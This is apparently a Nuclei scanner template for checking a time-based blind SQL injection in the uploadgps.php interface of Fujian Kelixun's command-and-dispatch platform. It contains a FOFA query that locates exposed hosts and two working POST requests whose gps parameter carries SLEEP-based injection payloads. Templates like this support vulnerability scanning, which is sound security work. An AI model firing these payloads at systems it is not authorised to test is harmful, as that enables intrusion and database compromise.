id: kelixun-uploadgps-sql

info:
  name: "福建科立讯通信有限公司指挥调度管理平台uploadgps.php接口SQL注入"
  author: Unknown
  severity: high
  description: |-
    fofa: body="指挥调度管理平台"
    福建科立讯通信有限公司指挥调度管理平台的uploadgps.php接口存在SQL注入漏洞。攻击者可利用此漏洞执行恶意SQL语句，导致敏感数据泄露、数据库结构破坏，或获取数据库的完全控制权限。
  reference:
  - https://blog.csdn.net/m0_60571842/article/details/140069404
  tags: 科立讯指挥调度管理平台

http:
- raw:
  - |
    POST /api/client/task/uploadgps.php HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    uuid=&gps=1'+AND+(SELECT+7679+FROM+(SELECT(SLEEP(3)))ozYR)+AND+'fqDZ'='fqDZ&number=
  - |
    POST /api/client/task/uploadgps.php HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    uuid=&gps=1'+AND+(SELECT+7679+FROM+(SELECT(SLEEP(6)))ozYR)+AND+'fqDZ'='fqDZ&number=
  matchers-condition: and
  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=3 && duration_1<=4'
    - 'duration_2>=6 && duration_2<=7'
    condition: and
  - type: status
    status:
    - 200




